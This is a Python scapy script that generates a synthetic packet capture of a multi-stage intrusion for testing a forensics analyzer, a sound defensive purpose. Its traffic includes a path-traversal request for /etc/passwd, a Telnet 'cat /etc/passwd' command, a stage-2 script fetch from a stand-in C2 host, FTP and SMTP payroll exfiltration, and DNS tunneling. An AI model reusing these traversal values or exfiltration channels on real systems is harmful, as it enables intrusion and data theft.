#!/usr/bin/env python3
"""Synthetic Incident PCAP/PCAPNG Generator for Automated PCAP Forensics Analyzer.

Creates a deterministic, completely benign synthetic packet capture containing realistic
multi-stage intrusion scenarios so users can test every analyzer module immediately:
  - Baseline ARP, ICMP, DNS (A/AAAA/CNAME), HTTP, and TLS (ClientHello with SNI)
  - Cleartext HTTP Basic Auth + URL-encoded POST credential theft + suspicious User-Agents
  - Multi-segment, out-of-order HTTP 200 OK PE dropper download with MIME masquerading
  - Chunked HTTP 200 OK PowerShell script download + GZIP-encoded PDF download
  - Cleartext FTP authentication & sensitive file retrieval (RETR)
  - Cleartext SMTP data-exfiltration email session
  - Interactive Telnet session with IAC negotiation, credentials, and shell commands
  - DNS DGA high-entropy queries with NXDOMAIN responses
  - DNS tunneling via long encoded subdomain labels and high-volume TXT responses
"""

from __future__ import annotations

import argparse
import base64
import gzip
import hashlib
import logging
import struct
from pathlib import Path

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet, Raw
from scapy.utils import wrpcap, wrpcapng

# Deterministic benign synthetic artifacts (safe dummy bytes, NOT real malware)
SYNTHETIC_PE_DROPPER: bytes = (
    b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
    b"\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
    b"DFIR-SYNTHETIC-BENIGN-PE-ARTIFACT-FOR-PCAP-CARVING-TEST-2026"
    + (b"\x00" * 64)
    + b"PE\x00\x00\x4c\x01\x01\x00"
    + (b"SIMULATED_DROPPER_SECTION_DATA_" * 40)
)

SYNTHETIC_PS1_SCRIPT: bytes = (
    b"# Benign synthetic DFIR test script\r\n"
    b"param([string]$Target = 'malicious-c2.example')\r\n"
    b"$wc = New-Object Net.WebClient\r\n"
    b"# Simulated beacon check-in (non-functional test payload)\r\n"
    b"Write-Output \"Simulated stage2 telemetry for $env:COMPUTERNAME\"\r\n"
)

SYNTHETIC_PDF_DOC: bytes = (
    b"%PDF-1.4\n"
    b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
    b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
    b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj\n"
    b"%% Synthetic DFIR Test Invoice Document\n"
    b"%%EOF\n"
)

# Network topology (RFC 1918 internal + RFC 5737 TEST-NET documentation IPs)
WORKSTATION_IP = "10.10.20.15"
WORKSTATION_MAC = "00:1a:2b:3c:4d:15"
ADMIN_HOST_IP = "10.10.20.22"
ADMIN_HOST_MAC = "00:1a:2b:3c:4d:22"
INTERNAL_DNS_IP = "10.10.20.53"
INTERNAL_DNS_MAC = "00:1a:2b:3c:4d:53"
MAIL_SERVER_IP = "10.10.20.25"
MAIL_SERVER_MAC = "00:1a:2b:3c:4d:25"
FTP_SERVER_IP = "10.10.20.21"
FTP_SERVER_MAC = "00:1a:2b:3c:4d:21"
ROUTER_TELNET_IP = "10.10.20.1"
ROUTER_TELNET_MAC = "00:1a:2b:3c:4d:01"
C2_SERVER_IP = "198.51.100.42"  # RFC 5737 TEST-NET-2
C2_SERVER_MAC = "00:aa:bb:cc:dd:42"
CDN_SERVER_IP = "203.0.113.77"  # RFC 5737 TEST-NET-3
CDN_SERVER_MAC = "00:aa:bb:cc:dd:77"
LEGIT_WEB_IP = "192.0.2.10"     # RFC 5737 TEST-NET-1
LEGIT_WEB_MAC = "00:aa:bb:cc:dd:10"


class PacketTimelineBuilder:
    """Helper to stamp monotonically increasing timestamps and realistic TCP sessions."""

    def __init__(self, start_ts: float = 1794765600.0) -> None:
        self.ts = start_ts
        self.packets: list[Packet] = []

    def emit(self, pkt: Packet, delta: float = 0.035) -> None:
        self.ts += delta
        pkt.time = self.ts
        self.packets.append(pkt)

    def tcp_session(
        self,
        client_ip: str,
        client_mac: str,
        client_port: int,
        server_ip: str,
        server_mac: str,
        server_port: int,
        exchanges: list[tuple[str, bytes]],
        out_of_order_server: bool = False,
    ) -> None:
        """Build a realistic TCP 3-way handshake, sequence-tracked data exchange, and FIN teardown."""
        c_seq = 10000
        s_seq = 50000

        # SYN -> SYN-ACK -> ACK
        self.emit(
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / TCP(sport=client_port, dport=server_port, flags="S", seq=c_seq)
        )
        c_seq += 1
        self.emit(
            Ether(src=server_mac, dst=client_mac)
            / IP(src=server_ip, dst=client_ip)
            / TCP(sport=server_port, dport=client_port, flags="SA", seq=s_seq, ack=c_seq)
        )
        s_seq += 1
        self.emit(
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / TCP(sport=client_port, dport=server_port, flags="A", seq=c_seq, ack=s_seq)
        )

        # Data segments
        for direction, data in exchanges:
            if direction == "C->S":
                self.emit(
                    Ether(src=client_mac, dst=server_mac)
                    / IP(src=client_ip, dst=server_ip)
                    / TCP(sport=client_port, dport=server_port, flags="PA", seq=c_seq, ack=s_seq)
                    / Raw(load=data)
                )
                c_seq += len(data)
            else:
                if out_of_order_server and len(data) > 600:
                    # Split into 3 segments and emit segment #2 before segment #1 to test TCP reassembly
                    p1 = data[:280]
                    p2 = data[280:640]
                    p3 = data[640:]
                    seg1 = (
                        Ether(src=server_mac, dst=client_mac)
                        / IP(src=server_ip, dst=client_ip)
                        / TCP(sport=server_port, dport=client_port, flags="PA", seq=s_seq, ack=c_seq)
                        / Raw(load=p1)
                    )
                    seg2 = (
                        Ether(src=server_mac, dst=client_mac)
                        / IP(src=server_ip, dst=client_ip)
                        / TCP(sport=server_port, dport=client_port, flags="PA", seq=s_seq + len(p1), ack=c_seq)
                        / Raw(load=p2)
                    )
                    seg3 = (
                        Ether(src=server_mac, dst=client_mac)
                        / IP(src=server_ip, dst=client_ip)
                        / TCP(sport=server_port, dport=client_port, flags="PA", seq=s_seq + len(p1) + len(p2), ack=c_seq)
                        / Raw(load=p3)
                    )
                    # Out-of-order delivery + duplicate retransmission of seg1
                    self.emit(seg2)
                    self.emit(seg1)
                    self.emit(seg1.copy())
                    self.emit(seg3)
                    s_seq += len(data)
                else:
                    self.emit(
                        Ether(src=server_mac, dst=client_mac)
                        / IP(src=server_ip, dst=client_ip)
                        / TCP(sport=server_port, dport=client_port, flags="PA", seq=s_seq, ack=c_seq)
                        / Raw(load=data)
                    )
                    s_seq += len(data)

        # FIN-ACK teardown
        self.emit(
            Ether(src=server_mac, dst=client_mac)
            / IP(src=server_ip, dst=client_ip)
            / TCP(sport=server_port, dport=client_port, flags="FA", seq=s_seq, ack=c_seq)
        )
        s_seq += 1
        self.emit(
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / TCP(sport=client_port, dport=server_port, flags="FA", seq=c_seq, ack=s_seq)
        )


def _build_tls_client_hello(sni: str) -> bytes:
    """Construct a valid minimal TLS 1.2/1.3 ClientHello carrying an SNI extension."""
    host = sni.encode("ascii")
    sni_entry = struct.pack("!BH", 0, len(host)) + host
    sni_list = struct.pack("!H", len(sni_entry)) + sni_entry
    sni_ext = struct.pack("!HH", 0x0000, len(sni_list)) + sni_list
    extensions = struct.pack("!H", len(sni_ext)) + sni_ext

    body = (
        b"\x03\x03"             # Client version TLS 1.2
        + b"\x42" * 32          # Random
        + b"\x00"               # Session ID length = 0
        + struct.pack("!H", 2)
        + b"\x13\x01"           # Cipher suite TLS_AES_128_GCM_SHA256
        + b"\x01\x00"           # Compression methods: null
        + extensions
    )
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + struct.pack("!H", len(handshake)) + handshake


def _chunked_encode(data: bytes, chunk_size: int = 80) -> bytes:
    out = bytearray()
    for i in range(0, len(data), chunk_size):
        chunk = data[i : i + chunk_size]
        out.extend(f"{len(chunk):x}\r\n".encode("ascii"))
        out.extend(chunk)
        out.extend(b"\r\n")
    out.extend(b"0\r\n\r\n")
    return bytes(out)


def build_sample_packets() -> list[Packet]:
    """Generate the complete multi-stage forensic test packet list."""
    b = PacketTimelineBuilder()

    # 1. Baseline ARP & ICMP network discovery
    b.emit(
        Ether(src=WORKSTATION_MAC, dst="ff:ff:ff:ff:ff:ff")
        / ARP(op=1, hwsrc=WORKSTATION_MAC, psrc=WORKSTATION_IP, pdst=ROUTER_TELNET_IP)
    )
    b.emit(
        Ether(src=ROUTER_TELNET_MAC, dst=WORKSTATION_MAC)
        / ARP(op=2, hwsrc=ROUTER_TELNET_MAC, psrc=ROUTER_TELNET_IP, hwdst=WORKSTATION_MAC, pdst=WORKSTATION_IP)
    )
    for seq in range(1, 4):
        b.emit(
            Ether(src=WORKSTATION_MAC, dst=LEGIT_WEB_MAC)
            / IP(src=WORKSTATION_IP, dst=LEGIT_WEB_IP)
            / ICMP(type=8, id=0x1234, seq=seq)
            / Raw(load=b"DFIR-ICMP-PING-BASELINE")
        )
        b.emit(
            Ether(src=LEGIT_WEB_MAC, dst=WORKSTATION_MAC)
            / IP(src=LEGIT_WEB_IP, dst=WORKSTATION_IP)
            / ICMP(type=0, id=0x1234, seq=seq)
            / Raw(load=b"DFIR-ICMP-PING-BASELINE")
        )

    # 2. Normal Passive DNS (A, AAAA, CNAME) + Malicious C2 Resolution
    dns_id = 0x2000
    normal_queries = [
        ("portal.corp.example", "A", [DNSRR(rrname="portal.corp.example", type="A", rdata=LEGIT_WEB_IP)]),
        (
            "cdn.corp.example",
            "A",
            [
                DNSRR(rrname="cdn.corp.example", type="CNAME", rdata="edge.corp.example"),
                DNSRR(rrname="edge.corp.example", type="A", rdata=LEGIT_WEB_IP),
                DNSRR(rrname="edge.corp.example", type="AAAA", rdata="2001:db8::10"),
            ],
        ),
        (
            "c2.malicious-c2.example",
            "A",
            [DNSRR(rrname="c2.malicious-c2.example", type="A", rdata=C2_SERVER_IP)],
        ),
        (
            "files.dropper-cdn.example",
            "A",
            [DNSRR(rrname="files.dropper-cdn.example", type="A", rdata=CDN_SERVER_IP)],
        ),
    ]
    for domain, qtype, answers in normal_queries:
        dns_id += 1
        sport = 51000 + (dns_id % 1000)
        b.emit(
            Ether(src=WORKSTATION_MAC, dst=INTERNAL_DNS_MAC)
            / IP(src=WORKSTATION_IP, dst=INTERNAL_DNS_IP)
            / UDP(sport=sport, dport=53)
            / DNS(id=dns_id, rd=1, qd=DNSQR(qname=domain, qtype=qtype))
        )
        b.emit(
            Ether(src=INTERNAL_DNS_MAC, dst=WORKSTATION_MAC)
            / IP(src=INTERNAL_DNS_IP, dst=WORKSTATION_IP)
            / UDP(sport=53, dport=sport)
            / DNS(id=dns_id, qr=1, aa=1, rd=1, ra=1, rcode=0, qd=DNSQR(qname=domain, qtype=qtype), an=answers)
        )

    # 3. TLS Session with SNI to Watchlist C2 Domain
    tls_ch = _build_tls_client_hello("beacon.malicious-c2.example")
    b.tcp_session(
        WORKSTATION_IP,
        WORKSTATION_MAC,
        52100,
        C2_SERVER_IP,
        C2_SERVER_MAC,
        443,
        [
            ("C->S", tls_ch),
            ("S->C", b"\x16\x03\x03\x00\x05\x02\x00\x00\x01\x00"),
        ],
    )

    # 4. Cleartext HTTP: Basic Auth + Suspicious User-Agent + URL-Encoded POST Login
    basic_b64 = base64.b64encode(b"admin:SuperSecret123!").decode("ascii")
    http_req_1 = (
        f"GET /admin/export?file=../../etc/passwd HTTP/1.1\r\n"
        f"Host: c2.malicious-c2.example\r\n"
        f"User-Agent: Mozilla/5.0 (compatible; EvilBot/1.0)\r\n"
        f"Authorization: Basic {basic_b64}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode("utf-8")
    http_resp_1 = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 27\r\n\r\n"
        b'{"status":"auth_accepted"}\n'
    )
    post_body = b"username=jdoe&password=Winter2026!&role=domain_admin&mfa=bypass"
    http_req_2 = (
        f"POST /portal/login HTTP/1.1\r\n"
        f"Host: portal.corp.example\r\n"
        f"User-Agent: python-requests/2.31.0\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(post_body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("utf-8") + post_body
    http_resp_2 = (
        b"HTTP/1.1 302 Found\r\n"
        b"Location: /dashboard\r\n"
        b"Content-Length: 0\r\n\r\n"
    )
    b.tcp_session(
        WORKSTATION_IP,
        WORKSTATION_MAC,
        52210,
        C2_SERVER_IP,
        C2_SERVER_MAC,
        80,
        [
            ("C->S", http_req_1),
            ("S->C", http_resp_1),
            ("C->S", http_req_2),
            ("S->C", http_resp_2),
        ],
    )

    # 5. HTTP Object Carving: Out-of-order PE Dropper masqueraded as image/png
    pe_req = (
        b"GET /static/update_patch.exe HTTP/1.1\r\n"
        b"Host: files.dropper-cdn.example\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        b"Connection: close\r\n\r\n"
    )
    pe_resp = (
        f"HTTP/1.1 200 OK\r\n"
        f"Content-Type: image/png\r\n"
        f"Content-Disposition: attachment; filename=\"update_patch.exe\"\r\n"
        f"Content-Length: {len(SYNTHETIC_PE_DROPPER)}\r\n\r\n"
    ).encode("ascii") + SYNTHETIC_PE_DROPPER
    b.tcp_session(
        WORKSTATION_IP,
        WORKSTATION_MAC,
        52220,
        CDN_SERVER_IP,
        CDN_SERVER_MAC,
        80,
        [("C->S", pe_req), ("S->C", pe_resp)],
        out_of_order_server=True,
    )

    # 6. HTTP Object Carving: Chunked PowerShell Stage-2 Script + GZIP PDF
    ps1_req = (
        b"GET /scripts/stage2.ps1 HTTP/1.1\r\n"
        b"Host: c2.malicious-c2.example\r\n"
        b"User-Agent: PowerShell/7.4\r\n"
        b"Connection: keep-alive\r\n\r\n"
    )
    ps1_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: text/plain\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n"
        + _chunked_encode(SYNTHETIC_PS1_SCRIPT, chunk_size=70)
    )
    pdf_gz = gzip.compress(SYNTHETIC_PDF_DOC, mtime=0)
    pdf_req = (
        b"GET /docs/invoice_2026.pdf HTTP/1.1\r\n"
        b"Host: portal.corp.example\r\n"
        b"User-Agent: Mozilla/5.0\r\n"
        b"Accept-Encoding: gzip\r\n"
        b"Connection: close\r\n\r\n"
    )
    pdf_resp = (
        f"HTTP/1.1 200 OK\r\n"
        f"Content-Type: application/pdf\r\n"
        f"Content-Encoding: gzip\r\n"
        f"Content-Length: {len(pdf_gz)}\r\n\r\n"
    ).encode("ascii") + pdf_gz
    b.tcp_session(
        WORKSTATION_IP,
        WORKSTATION_MAC,
        52230,
        C2_SERVER_IP,
        C2_SERVER_MAC,
        8080,
        [
            ("C->S", ps1_req),
            ("S->C", ps1_resp),
            ("C->S", pdf_req),
            ("S->C", pdf_resp),
        ],
    )

    # 7. Cleartext FTP Authentication & File Exfiltration
    b.tcp_session(
        WORKSTATION_IP,
        WORKSTATION_MAC,
        52300,
        FTP_SERVER_IP,
        FTP_SERVER_MAC,
        21,
        [
            ("S->C", b"220 ProFTPD 1.3.8 Corporate Archive Server ready.\r\n"),
            ("C->S", b"USER backup_svc\r\n"),
            ("S->C", b"331 Password required for backup_svc.\r\n"),
            ("C->S", b"PASS ExfilPass!2026\r\n"),
            ("S->C", b"230 User backup_svc logged in.\r\n"),
            ("C->S", b"CWD /confidential/finance\r\n"),
            ("S->C", b"250 CWD command successful.\r\n"),
            ("C->S", b"RETR payroll_2026.csv\r\n"),
            ("S->C", b"226 Transfer complete.\r\n"),
            ("C->S", b"QUIT\r\n"),
            ("S->C", b"221 Goodbye.\r\n"),
        ],
    )

    # 8. Cleartext SMTP Exfiltration Email
    smtp_data = (
        b"From: Finance Ops <finance@corp.example>\r\n"
        b"To: External Drop <drop@malicious-c2.example>\r\n"
        b"Subject: Q4 Payroll Export [CONFIDENTIAL]\r\n"
        b"Date: Sun, 15 Nov 2026 14:22:00 +0000\r\n"
        b"X-Mailer: CorpRelay/2.1\r\n\r\n"
        b"Attached is the Q4 payroll archive requested earlier.\r\n"
        b"Ref: payroll_2026.csv\r\n"
        b".\r\n"
    )
    b.tcp_session(
        WORKSTATION_IP,
        WORKSTATION_MAC,
        52400,
        MAIL_SERVER_IP,
        MAIL_SERVER_MAC,
        25,
        [
            ("S->C", b"220 mail.corp.example ESMTP Postfix\r\n"),
            ("C->S", b"EHLO workstation-15.corp.example\r\n"),
            ("S->C", b"250-mail.corp.example\r\n250 OK\r\n"),
            ("C->S", b"MAIL FROM:<finance@corp.example>\r\n"),
            ("S->C", b"250 2.1.0 Ok\r\n"),
            ("C->S", b"RCPT TO:<drop@malicious-c2.example>\r\n"),
            ("S->C", b"250 2.1.5 Ok\r\n"),
            ("C->S", b"DATA\r\n"),
            ("S->C", b"354 End data with <CR><LF>.<CR><LF>\r\n"),
            ("C->S", smtp_data),
            ("S->C", b"250 2.0.0 Ok: queued as 9F8A12C\r\n"),
            ("C->S", b"QUIT\r\n"),
            ("S->C", b"221 2.0.0 Bye\r\n"),
        ],
    )

    # 9. Cleartext Telnet Interactive Session (with IAC negotiation)
    b.tcp_session(
        ADMIN_HOST_IP,
        ADMIN_HOST_MAC,
        52500,
        ROUTER_TELNET_IP,
        ROUTER_TELNET_MAC,
        23,
        [
            ("S->C", b"\xff\xfd\x18\xff\xfb\x01\r\nEdgeRouter-01 login: "),
            ("C->S", b"\xff\xfc\x18root\r\n"),
            ("S->C", b"Password: "),
            ("C->S", b"toor2026!\r\n"),
            ("S->C", b"\r\nroot@EdgeRouter-01:~# "),
            ("C->S", b"whoami\r\n"),
            ("S->C", b"root\r\nroot@EdgeRouter-01:~# "),
            ("C->S", b"cat /etc/passwd\r\n"),
            ("S->C", b"root:x:0:0:root:/root:/bin/sh\r\nroot@EdgeRouter-01:~# "),
            ("C->S", b"exit\r\n"),
        ],
    )

    # 10. DNS DGA Burst (High Shannon Entropy Labels + NXDOMAIN responses)
    dga_domains = [
        "xk9q2m8z7v4w1p6n.evil-dga-net.example",
        "f3j8k2l9m4n7p1q5.evil-dga-net.example",
        "z7c4v9b2n6m1x8k3.evil-dga-net.example",
        "q5w9e2r7t4y8u1i6.evil-dga-net.example",
        "h8j3k6l1p9o4i2u7.evil-dga-net.example",
        "m2n7b4v9c1x6z8a3.evil-dga-net.example",
        "r6t1y9u4i2o7p5s8.evil-dga-net.example",
        "d4f8g1h6j9k2l5z7.evil-dga-net.example",
    ]
    for dom in dga_domains:
        dns_id += 1
        sport = 53000 + (dns_id % 1000)
        b.emit(
            Ether(src=WORKSTATION_MAC, dst=INTERNAL_DNS_MAC)
            / IP(src=WORKSTATION_IP, dst=INTERNAL_DNS_IP)
            / UDP(sport=sport, dport=53)
            / DNS(id=dns_id, rd=1, qd=DNSQR(qname=dom, qtype="A"))
        )
        b.emit(
            Ether(src=INTERNAL_DNS_MAC, dst=WORKSTATION_MAC)
            / IP(src=INTERNAL_DNS_IP, dst=WORKSTATION_IP)
            / UDP(sport=53, dport=sport)
            / DNS(id=dns_id, qr=1, rd=1, ra=1, rcode=3, qd=DNSQR(qname=dom, qtype="A"))
        )

    # 11. DNS Tunneling (Long Encoded Subdomain Labels + High-Volume TXT Exfiltration)
    tunnel_chunks = [
        "4a6f686e446f655f506179726f6c6c5f4368756e6b30315f39613866",
        "7265636f72645f30325f73736e5f656e637279707465645f64617461",
        "6368756e6b5f30335f63726564656e7469616c5f64756d705f686578",
        "6368756e6b5f30345f6163746976655f6469726563746f72795f6b65",
        "6368756e6b5f30355f6b65726265726f735f7469636b65745f626c6f",
        "6368756e6b5f30365f66696e616e63655f6c65646765725f32303236",
        "6368756e6b5f30375f736572766963655f6163636f756e745f686173",
        "6368756e6b5f30385f66696e616c5f656f665f636865636b73756d39",
    ]
    for idx, hex_chunk in enumerate(tunnel_chunks, start=1):
        dns_id += 1
        sport = 54000 + idx
        qname = f"{hex_chunk}.tun.exfil-dns.example"
        txt_reply = f"ACK_SEQ={idx};CMD=CONTINUE;PAYLOAD={'A' * 72}".encode("ascii")
        b.emit(
            Ether(src=WORKSTATION_MAC, dst=INTERNAL_DNS_MAC)
            / IP(src=WORKSTATION_IP, dst=INTERNAL_DNS_IP)
            / UDP(sport=sport, dport=53)
            / DNS(id=dns_id, rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
        )
        b.emit(
            Ether(src=INTERNAL_DNS_MAC, dst=WORKSTATION_MAC)
            / IP(src=INTERNAL_DNS_IP, dst=WORKSTATION_IP)
            / UDP(sport=53, dport=sport)
            / DNS(
                id=dns_id,
                qr=1,
                rd=1,
                ra=1,
                rcode=0,
                qd=DNSQR(qname=qname, qtype="TXT"),
                an=[DNSRR(rrname=qname, type="TXT", rdata=txt_reply)],
            )
        )

    return b.packets


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate a synthetic DFIR test capture (.pcap or .pcapng) for Automated PCAP Forensics Analyzer."
    )
    parser.add_argument(
        "-o",
        "--output",
        default="samples/sample_incident.pcap",
        help="Destination path for generated capture file (default: samples/sample_incident.pcap)",
    )
    parser.add_argument(
        "--pcapng",
        action="store_true",
        help="Write capture in PCAPNG format instead of classic PCAP",
    )
    args = parser.parse_args()

    out_path = Path(args.output)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    packets = build_sample_packets()

    if args.pcapng or out_path.suffix.lower() == ".pcapng":
        wrpcapng(str(out_path), packets)
        fmt = "PCAPNG"
    else:
        wrpcap(str(out_path), packets)
        fmt = "PCAP"

    pe_md5 = hashlib.md5(SYNTHETIC_PE_DROPPER).hexdigest()
    pe_sha256 = hashlib.sha256(SYNTHETIC_PE_DROPPER).hexdigest()
    ps1_sha256 = hashlib.sha256(SYNTHETIC_PS1_SCRIPT).hexdigest()
    pdf_sha256 = hashlib.sha256(SYNTHETIC_PDF_DOC).hexdigest()

    print(f"[+] Generated {fmt} test capture: {out_path} ({len(packets)} packets)")
    print(f"    - Synthetic PE Dropper  MD5   : {pe_md5}")
    print(f"    - Synthetic PE Dropper  SHA256: {pe_sha256}")
    print(f"    - Synthetic PS1 Script  SHA256: {ps1_sha256}")
    print(f"    - Synthetic PDF Doc     SHA256: {pdf_sha256}")
    print("    - Scenarios: ARP, ICMP, TLS SNI, HTTP Basic/POST Creds, Out-of-Order PE Carving (MIME Mismatch),")
    print("                 Chunked PS1, GZIP PDF, FTP, SMTP, Telnet, DNS DGA + NXDOMAIN, DNS TXT Tunneling")


if __name__ == "__main__":
    main()
